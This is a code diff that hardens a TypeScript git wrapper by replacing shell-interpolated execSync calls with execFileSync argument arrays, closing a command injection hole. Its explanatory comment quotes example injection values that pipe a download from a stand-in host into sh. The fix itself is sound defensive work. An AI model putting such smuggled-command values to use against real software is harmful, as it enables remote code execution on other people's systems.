@@ -9,7 +9,7 @@
  * - Handle merge conflicts
  */
 
-import { execSync } from "child_process";
+import { execFileSync } from "child_process";
 import path from "path";
 
 export interface GitStatus {
@@ -40,17 +40,36 @@ export class GitManager {
   }
 
   /**
-   * Execute git command
+   * Execute a git command.
+   *
+   * SECURITY FIX (2026-08-28, full-codebase review per Gavin's "spare no
+   * line of code" request): this used to be `execSync(\`cd "${repoPath}"
+   * && git ${command}\`)` with the command string built by interpolating
+   * caller-controlled values (branch names, commit messages, the
+   * `--base`/requirement text that ultimately comes from cli.ts's argv)
+   * directly into a shell string. That's real, exploitable shell command
+   * injection — e.g. a `--base` value like
+   * `master"; curl evil.sh|sh #` or a commit message containing
+   * `$(curl evil.sh|sh)` would execute arbitrary commands, and for the
+   * `checkout`/`pull` calls inside createBranch() this fired BEFORE the
+   * human-approval gate (step 11) was ever reached — no `--approve`
+   * needed. Fixed by switching to execFileSync with an argv array: git is
+   * invoked directly (no shell), so every argument is passed to the
+   * process as a literal string regardless of what characters it
+   * contains — quotes, `$()`, backticks, `;`, none of them are ever
+   * interpreted. `cwd` replaces the `cd "..." &&` prefix, closing the same
+   * hole for repoPath itself.
    */
-  private exec(command: string): string {
+  private exec(args: string[]): string {
     try {
-      return execSync(`cd "${this.repoPath}" && git ${command}`, {
+      return execFileSync("git", args, {
+        cwd: this.repoPath,
         encoding: "utf-8",
         stdio: ["pipe", "pipe", "pipe"],
       }).trim();
     } catch (error) {
       throw new Error(
-        `Git command failed: ${command}\n${error instanceof Error ? error.message : String(error)}`
+        `Git command failed: git ${args.join(" ")}\n${error instanceof Error ? error.message : String(error)}`
       );
     }
   }
@@ -60,9 +79,9 @@ export class GitManager {
    */
   async getStatus(): Promise<GitStatus> {
     try {
-      const branch = this.exec("branch --show-current");
+      const branch = this.exec(["branch", "--show-current"]);
       const statusOutput = this.exec(
-        'status --porcelain=v2 --branch --untracked-files=all'
+        ["status", "--porcelain=v2", "--branch", "--untracked-files=all"]
       );
 
       const lines = statusOutput.split("\n");
@@ -127,7 +146,7 @@ export class GitManager {
    */
   async createBranch(branchName: string, baseBranch?: string): Promise<void> {
     try {
-      const base = baseBranch || this.exec("branch --show-current");
+      const base = baseBranch || this.exec(["branch", "--show-current"]);
       if (!base) {
         throw new Error(
           "Could not determine a base branch (not currently on a branch, e.g. detached HEAD) — pass baseBranch explicitly."
@@ -138,22 +157,22 @@ export class GitManager {
       // a branch name that doesn't exist locally (e.g. caller passed "main"
       // on a repo whose default is "master") would otherwise hard-fail the
       // whole operation before any work starts.
-      const currentBranch = this.exec("branch --show-current");
+      const currentBranch = this.exec(["branch", "--show-current"]);
       if (currentBranch !== base) {
-        this.exec(`checkout ${base}`);
+        this.exec(["checkout", base]);
       }
 
       // Best-effort remote sync: a missing/unreachable origin (offline dev,
       // fresh local-only repo) must not block local branch creation.
       try {
-        this.exec(`pull origin ${base} --ff-only`);
+        this.exec(["pull", "origin", base, "--ff-only"]);
       } catch (pullError) {
         console.warn(
           `   ⚠️  Could not sync '${base}' with origin (offline, no remote, or diverged) — continuing with local state.`
         );
       }
 
-      this.exec(`checkout -b ${branchName}`);
+      this.exec(["checkout", "-b", branchName]);
     } catch (error) {
       throw new Error(
         `Failed to create branch ${branchName}: ${error instanceof Error ? error.message : String(error)}`
@@ -166,7 +185,7 @@ export class GitManager {
    */
   async stageAll(): Promise<void> {
     try {
-      this.exec("add -A");
+      this.exec(["add", "-A"]);
     } catch (error) {
       throw new Error(
         `Failed to stage changes: ${error instanceof Error ? error.message : String(error)}`
@@ -179,13 +198,13 @@ export class GitManager {
    */
   async commit(message: string): Promise<CommitInfo> {
     try {
-      this.exec(`commit -m "${message}"`);
+      this.exec(["commit", "-m", message]);
 
       // Get commit info
-      const hash = this.exec("rev-parse HEAD").substring(0, 7);
-      const author = this.exec("config user.name");
-      const date = new Date(this.exec("log -1 --format=%ai"));
-      const fullMessage = this.exec("log -1 --format=%B");
+      const hash = this.exec(["rev-parse", "HEAD"]).substring(0, 7);
+      const author = this.exec(["config", "user.name"]);
+      const date = new Date(this.exec(["log", "-1", "--format=%ai"]));
+      const fullMessage = this.exec(["log", "-1", "--format=%B"]);
 
       return {
         hash,
@@ -205,8 +224,9 @@ export class GitManager {
    */
   async push(branchName: string, force = false): Promise<void> {
     try {
-      const forceFlag = force ? "--force-with-lease" : "";
-      this.exec(`push origin ${branchName} ${forceFlag}`.trim());
+      const args = ["push", "origin", branchName];
+      if (force) args.push("--force-with-lease");
+      this.exec(args);
     } catch (error) {
       throw new Error(
         `Failed to push: ${error instanceof Error ? error.message : String(error)}`
@@ -227,7 +247,7 @@ export class GitManager {
     try {
       const commits: CommitInfo[] = [];
       const commitLines = this.exec(
-        `log ${baseBranch}..HEAD --format="%H|%an|%ai|%B"`
+        ["log", `${baseBranch}..HEAD`, "--format=%H|%an|%ai|%B"]
       ).split("\n");
 
       for (const line of commitLines) {
@@ -263,7 +283,7 @@ export class GitManager {
    */
   async branchExists(branchName: string): Promise<boolean> {
     try {
-      this.exec(`rev-parse --verify ${branchName}`);
+      this.exec(["rev-parse", "--verify", branchName]);
       return true;
     } catch {
       return false;
@@ -276,7 +296,7 @@ export class GitManager {
   async deleteBranch(branchName: string, force = false): Promise<void> {
     try {
       const forceFlag = force ? "-D" : "-d";
-      this.exec(`branch ${forceFlag} ${branchName}`);
+      this.exec(["branch", forceFlag, branchName]);
     } catch (error) {
       throw new Error(
         `Failed to delete branch: ${error instanceof Error ? error.message : String(error)}`
@@ -290,7 +310,7 @@ export class GitManager {
   async getRecentCommits(count = 5): Promise<CommitInfo[]> {
     try {
       const commits: CommitInfo[] = [];
-      const output = this.exec(`log -${count} --format="%H|%an|%ai|%B"`);
+      const output = this.exec(["log", `-${count}`, "--format=%H|%an|%ai|%B"]);
 
       for (const line of output.split("\n\n")) {
         if (!line) continue;
@@ -317,7 +337,7 @@ export class GitManager {
    */
   async getDiff(fromRef: string, toRef = "HEAD"): Promise<string> {
     try {
-      return this.exec(`diff ${fromRef} ${toRef}`);
+      return this.exec(["diff", fromRef, toRef]);
     } catch (error) {
       throw new Error(
         `Failed to get diff: ${error instanceof Error ? error.message : String(error)}`
@@ -330,7 +350,7 @@ export class GitManager {
    */
   async hasUncommittedChanges(): Promise<boolean> {
     try {
-      this.exec("diff --quiet");
+      this.exec(["diff", "--quiet"]);
       return false;
     } catch {
       return true;
@@ -344,7 +364,7 @@ export class GitManager {
    */
   async getGitHubSlug(): Promise<string | null> {
     try {
-      const url = this.exec("remote get-url origin");
+      const url = this.exec(["remote", "get-url", "origin"]);
       const match = url.match(/github\.com[/:]([^/]+\/[^/.]+?)(\.git)?$/);
       return match ? match[1] : null;
     } catch {
